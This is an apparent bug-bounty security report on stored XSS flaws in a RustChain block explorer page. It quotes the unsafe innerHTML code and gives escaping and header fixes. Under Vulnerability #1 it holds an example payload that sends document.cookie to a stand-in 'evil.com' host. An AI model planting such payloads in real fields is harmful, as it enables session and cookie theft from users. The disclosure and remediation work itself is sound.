# Security Report: RustChain Block Explorer — Enhanced Explorer (PR #4)

**Target:** `explorer/enhanced-explorer.html` (line 539, 551, 583)  
**Severity:** 🔴 CRITICAL — multiple unescaped innerHTML injections  
**Bounty:** #68 — Red Team: Block Explorer Security  
**Auditor:** kuanglaodi2-sudo  
**Date:** 2026-03-19  

---

## Executive Summary

The RustChain Enhanced Explorer (`enhanced-explorer.html`) contains **multiple critical stored XSS vulnerabilities**. Unlike the base `index.html` which uses `escapeHtml()` correctly, the enhanced explorer injects miner IDs, architecture names, wallet addresses, and transaction hashes directly into `innerHTML` without sanitization.

---

## Vulnerability #1 — CRITICAL: Stored XSS via Miner IDs (CVSS 9.1)

### Location

`enhanced-explorer.html` lines 539-558:

```javascript
overviewTable.innerHTML = minerList.slice(0, 10).map(miner => `
    <tr>
        <td><strong>${miner.miner_id || 'Unknown'}</strong></td>  ← UNSAFE
        <td><span class="arch-badge">${miner.architecture || miner.device_arch || 'Unknown'}</span></td>  ← UNSAFE
        ...
    </tr>
`).join('');
```

### Attack Vector

A miner registers (or the API returns) with a malicious `miner_id`:

```json
{
  "miner_id": "<img src=x onerror='fetch(\"https://evil.com/steal?miner=\"+document.cookie)'>",
  "architecture": "<svg onload=alert(1)>"
}
```

When viewed in the explorer, the `onerror` fires immediately — no user interaction needed.

### Impact

- **Full XSS** in explorer context
- Cookie/session token theft
- DOM manipulation, data exfiltration
- Worm-like spread if shared links expose the XSS

### Recommended Fix

```javascript
// Add escapeHtml helper (same as index.html uses):
function escapeHtml(str) {
    if (!str) return '';
    return String(str)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#39;');
}

// Use it everywhere:
overviewTable.innerHTML = minerList.slice(0, 10).map(miner => `
    <tr>
        <td><strong>${escapeHtml(miner.miner_id || 'Unknown')}</strong></td>
        <td><span class="arch-badge">${escapeHtml(miner.architecture || miner.device_arch || 'Unknown')}</span></td>
        ...
    </tr>
`).join('');
```

---

## Vulnerability #2 — CRITICAL: Stored XSS via Wallet Addresses (CVSS 9.1)

### Location

`enhanced-explorer.html` lines 551-570:

```javascript
allMinersTable.innerHTML = minerList.map(miner => `
    <tr>
        <td><strong>${miner.miner_id || 'Unknown'}</strong></td>  ← UNSAFE
        ...
        <td><code>${miner.wallet || miner.wallet_address || 'N/A'}</code></td>  ← UNSAFE
        ...
    </tr>
`).join('');
```

### Impact

A malicious wallet address (e.g., containing `<script>` or `<img onerror=...>`) renders XSS in the explorer's miner table.

---

## Vulnerability #3 — HIGH: Stored XSS via Transaction Hashes/Addresses (CVSS 8.6)

### Location

`enhanced-explorer.html` lines 583-598:

```javascript
table.innerHTML = transactions.transactions.slice(0, 20).map(tx => `
    <tr>
        <td><code>${tx.hash || tx.tx_hash || 'N/A'}</code></td>   ← UNSAFE
        <td><code>${tx.from || 'N/A'}</code></td>                 ← UNSAFE
        <td><code>${tx.to || 'N/A'}</code></td>                   ← UNSAFE
        ...
    </tr>
`).join('');
```

### Impact

A malicious transaction on-chain (or API response injection) could inject scripts via tx hash, from address, or to address.

---

## Vulnerability #4 — MEDIUM: No CORS Validation on API Fetch (CVSS 5.3)

### Location

`enhanced-explorer.html` — all `fetchAPI()` calls:

```javascript
async function fetchAPI(endpoint) {
    try {
        const resp = await fetch(`${API_BASE}${endpoint}`);
        // ← No CORS validation, no origin check
        return await resp.json();
    } catch { ... }
}
```

### Impact

- Any website can embed the explorer in an iframe and make API calls on behalf of the user
- Sensitive API data exposed to malicious cross-origin sites
- Combined with Vuln #1-3: a malicious site could trigger the explorer, then steal data via the XSS

### Recommended Fix

```javascript
async function fetchAPI(endpoint) {
    const resp = await fetch(`${API_BASE}${endpoint}`, {
        credentials: 'omit',         // Don't send cookies cross-origin
        mode: 'cors'               // Explicit CORS mode
    });
    if (!resp.ok) throw new Error(...);
    return await resp.json();
}
```

---

## Vulnerability #5 — LOW: No Rate Limiting in JavaScript

### Location

`enhanced-explorer.html` — `loadMiners()`, `loadTransactions()`, etc. poll without debouncing.

### Impact

A malicious page embedding the explorer could trigger rapid-fire API calls causing DoS against the RustChain node.

### Recommended Fix

```javascript
let minersDebounce = null;
async function loadMiners() {
    clearTimeout(minersDebounce);
    minersDebounce = setTimeout(async () => {
        // actual fetch
    }, 300);
}
```

---

## Comparison: index.html vs enhanced-explorer.html

| File | escapeHtml | XSS Risk |
|------|-----------|----------|
| `index.html` | ✅ Present at line 49, used in all render functions | LOW — mostly safe |
| `enhanced-explorer.html` | ❌ NOT defined, NOT used | 🔴 CRITICAL — 3+ injection points |

---

## Vulnerability Summary

| # | Vulnerability | Severity | CVSS | File |
|---|--------------|----------|------|------|
| 1 | Stored XSS via miner_id | 🔴 CRITICAL | 9.1 | enhanced-explorer.html:539 |
| 2 | Stored XSS via wallet address | 🔴 CRITICAL | 9.1 | enhanced-explorer.html:551 |
| 3 | Stored XSS via tx hash/from/to | 🔴 HIGH | 8.6 | enhanced-explorer.html:583 |
| 4 | No CORS validation on fetch | 🟡 MEDIUM | 5.3 | enhanced-explorer.html |
| 5 | No request debouncing/rate limiting | 🟢 LOW | 3.1 | enhanced-explorer.html |

---

## Files in This PR

| File | Purpose |
|------|---------|
| `explorer/SECURITY_REPORT.md` | This report |
| `explorer/patched/enhanced-explorer.html` | Hardened version — all vulnerabilities fixed |
| `explorer/pocs/vuln1_miner_id_xss.html` | PoC for Vuln #1 |
| `explorer/pocs/vuln3_tx_hash_xss.html` | PoC for Vuln #3 |
| `explorer/CLAUDE.md` | Audit context |

---

## Recommended Security Headers

```
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Content-Security-Policy: default-src 'none'; script-src 'self'; connect-src https://50.28.86.131 https://rustchain.org; frame-ancestors 'none'
Referrer-Policy: strict-origin-when-cross-origin
```
